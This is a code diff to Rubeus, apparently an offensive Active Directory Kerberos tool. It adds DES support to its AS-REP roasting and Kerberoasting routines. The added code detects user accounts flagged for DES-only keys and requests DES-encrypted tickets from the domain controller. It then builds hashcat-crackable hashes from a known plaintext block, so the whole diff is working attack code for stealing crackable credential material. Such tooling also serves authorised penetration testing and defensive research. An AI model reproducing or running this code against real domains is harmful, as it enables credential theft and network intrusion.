@@ -76,8 +76,17 @@ namespace Rubeus
                 {
                     string samAccountName = (string)user["samaccountname"];
                     string distinguishedName = (string)user["distinguishedname"];
+                    Interop.LDAPUserAccountControl userUAC = (Interop.LDAPUserAccountControl)user["useraccountcontrol"];
                     Console.WriteLine("[*] SamAccountName         : {0}", samAccountName);
                     Console.WriteLine("[*] DistinguishedName      : {0}", distinguishedName);
+                    if ((userUAC & Interop.LDAPUserAccountControl.USE_DES_KEY_ONLY) != 0)
+                    {
+                        Console.WriteLine("[*] User supports DES!");
+                        if (!supportedEType.Equals("aes"))
+                        {
+                            supportedEType = "des";
+                        }
+                    }
 
                     GetASRepHash(samAccountName, domain, domainController, format, outFile, supportedEType);
                 }
@@ -105,17 +114,27 @@ namespace Rubeus
             string requestedEType;
 
             // Specify RC4 as the encryption type by default, unless the /aes flag was provided
-            if (supportedEType == "rc4")
+            if (supportedEType == "rc4" || supportedEType == "des")
             {
-                reqBytes = AS_REQ.NewASReq(userName, domain, Interop.KERB_ETYPE.rc4_hmac).Encode().Encode();
+                Interop.KERB_ETYPE etype = Interop.KERB_ETYPE.rc4_hmac;
+                requestedEType = "rc4";
+                if (supportedEType.Equals("des"))
+                {
+                    if (format == "john")
+                    {
+                        Console.WriteLine("[!] DES not supported for john format, please rerun with '/format:hashcat'");
+                        return;
+                    }
+                    etype = Interop.KERB_ETYPE.des_cbc_md5;
+                    requestedEType = "des";
+                }
+                reqBytes = AS_REQ.NewASReq(userName, domain, etype).Encode().Encode();
                 response = Networking.SendBytes(dcIP, 88, reqBytes);
 
                 if (response == null)
                 {
                     return;
                 }
-
-                requestedEType = "rc4";
 
                 // decode the supplied bytes to an AsnElt object
                 //  false == ignore trailing garbage
@@ -215,6 +234,12 @@ namespace Rubeus
                     {
                         checksumStart = repHash.Length - 24;
                         hashString = String.Format("$krb5asrep$18${0}${1}${2}${3}", userName, domain, repHash.Substring(checksumStart), repHash.Substring(0, checksumStart));
+                    }
+                    else if (requestedEType == "des")
+                    {
+                        int wholeLength = 193 + (domain.Length * 2);
+                        byte[] knownPlain = { 0x79, 0x81, (byte)wholeLength, 0x30, 0x81, (byte)(wholeLength - 3), 0xA0, 0x13 };
+                        hashString = Crypto.FormDESHash(repHash, knownPlain);
                     }
                     else
                     {
@@ -915,7 +940,7 @@ namespace Rubeus
             return false;
         }
 
-        public static void DisplayTGShash(KRB_CRED cred, bool kerberoastDisplay = false, string kerberoastUser = "USER", string kerberoastDomain = "DOMAIN", string outFile = "", bool simpleOutput = false)
+        public static void DisplayTGShash(KRB_CRED cred, bool kerberoastDisplay = false, string kerberoastUser = "USER", string kerberoastDomain = "DOMAIN", string outFile = "", bool simpleOutput = false, string desPlainText = "")
         {
             // output the hash of the encrypted KERB-CRED service ticket in a kerberoast hash form
 
@@ -933,6 +958,10 @@ namespace Rubeus
                 int checksumStart = cipherText.Length - 24;
                 //Enclose SPN in *s rather than username, realm and SPN. This doesn't impact cracking, but might affect loading into hashcat.            
                 hash = String.Format("$krb5tgs${0}${1}${2}$*{3}*${4}${5}", encType, kerberoastUser, kerberoastDomain, sname, cipherText.Substring(checksumStart), cipherText.Substring(0, checksumStart));
+            }
+            else if (encType == 3 && !string.IsNullOrWhiteSpace(desPlainText))
+            {
+                hash = Crypto.FormDESHash(cipherText, Helpers.StringToByteArray(desPlainText));
             }
             //if encType==23
             else
@@ -972,7 +1001,7 @@ namespace Rubeus
                             }
                             else
                             {
-                                Console.WriteLine("  Kerberoast Hash       :  {0}", line);
+                                Console.WriteLine("  Kerberoast Hash          :  {0}", line);
                             }
                         }
                         else
@@ -997,7 +1026,7 @@ namespace Rubeus
                     }
                     else
                     {
-                        Console.WriteLine("  Kerberoast Hash       :  {0}", hash);
+                        Console.WriteLine("  Kerberoast Hash          :  {0}", hash);
                     }
                 }
             }
